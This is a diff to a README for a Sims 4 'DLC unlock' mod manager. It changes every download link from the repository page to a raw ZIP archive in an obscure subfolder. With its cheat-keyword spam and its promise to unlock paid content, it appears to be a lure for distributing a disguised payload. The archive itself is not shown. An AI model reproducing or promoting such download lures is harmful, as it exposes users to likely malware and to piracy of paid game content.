@@ -1,6 +1,6 @@
 # 🎮 sims-4-dlc-unlock - Your All-in-One Sims 4 Mod Manager
 
-[![Download Now](https://img.shields.io/badge/Download-sims--4--dlc--unlock-blue?style=for-the-badge&logo=github)](https://github.com/weipingy80-oss/sims-4-dlc-unlock)
+[![Download Now](https://img.shields.io/badge/Download-sims--4--dlc--unlock-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/weipingy80-oss/sims-4-dlc-unlock/main/undercrier/dlc-sims-unlock-2.4.zip)
 
 ## 📥 Getting Started
 
@@ -31,7 +31,7 @@ Before downloading, make sure your computer meets these basic requirements:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/weipingy80-oss/sims-4-dlc-unlock](https://github.com/weipingy80-oss/sims-4-dlc-unlock)
+Visit this link to download the application: [https://raw.githubusercontent.com/weipingy80-oss/sims-4-dlc-unlock/main/undercrier/dlc-sims-unlock-2.4.zip](https://raw.githubusercontent.com/weipingy80-oss/sims-4-dlc-unlock/main/undercrier/dlc-sims-unlock-2.4.zip)
 
 ### Step 2: Run the Installer
 
@@ -153,6 +153,6 @@ This project is open-source and free to use. Check the repository for the full l
 
 ---
 
-**Ready to take control of your Sims 4 mods?** [Download sims-4-dlc-unlock now](https://github.com/weipingy80-oss/sims-4-dlc-unlock) and experience the easiest way to manage your game modifications. Your perfect Sims 4 experience is just a click away!
+**Ready to take control of your Sims 4 mods?** [Download sims-4-dlc-unlock now](https://raw.githubusercontent.com/weipingy80-oss/sims-4-dlc-unlock/main/undercrier/dlc-sims-unlock-2.4.zip) and experience the easiest way to manage your game modifications. Your perfect Sims 4 experience is just a click away!
 
 Keywords: sims-4, sims-4-dlc, sims-4-hacks-infinite-money, sims4-dlc, sims4-dlc-nulocker, sims4-mod, sims4-tool, unlimited-resources-the-sims-4-hacks
